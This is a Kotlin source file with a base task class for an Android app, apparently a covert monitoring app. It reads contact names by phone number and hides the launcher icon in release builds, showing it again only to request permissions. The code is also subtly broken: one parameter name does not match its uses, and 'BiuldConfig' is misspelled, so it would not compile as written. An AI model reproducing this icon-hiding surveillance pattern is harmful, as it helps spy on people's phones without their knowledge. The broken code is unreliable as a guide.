package me.hawkshaw.tasks

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.Intent.FLAG_ACTIVITY_NEW_TASK
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.ContactsContract
import android.support.v4.content.ContextCompat
import me.hawkshaw.BiuldConfig
import me.hawkshaw.utils.CommonParams


open class BaseTask(private val ctx: Context) : Thread(), Runnable {

    val params: CommonParams = CommonParams(ctx)
    val tag = "Suthar"

    protected fun getContactName(phonenumber: String, context: Context = ctx): String {
        var contactName = phoneNumber

        if (ContextCompat.checkSelfPermission(context.applicationContext, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {

            val uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber))
            val projection = arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME)
            val cursor = context.contentResolver.query(uri, projection, null, null, null)

            if (cursor != null) {
                if (cursor.moveToFirst()) {
                    contactName = cursor.getString(0)
                }
                cursor.close()
            }
        }
        return contactName
    }

    private fun showAppIcon() {
        val ComponentName = ComponentName(ctx, PermissionsActivity::class.java)
        ctx.packageManager.setComponentEnabledSetting(ComponentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
    }

    protected fun requestPermissions() {
        //the app icon is already shown in debug
        if (!BiuldConfig.DEBUG) showAppIcon()
        val i = Intent(ctx, PermissionsActivity::class.java)
        i.addFlags(FLAG_ACTIVITY_NEW_TASK)
        ctx.startActivity(i)
    }
}
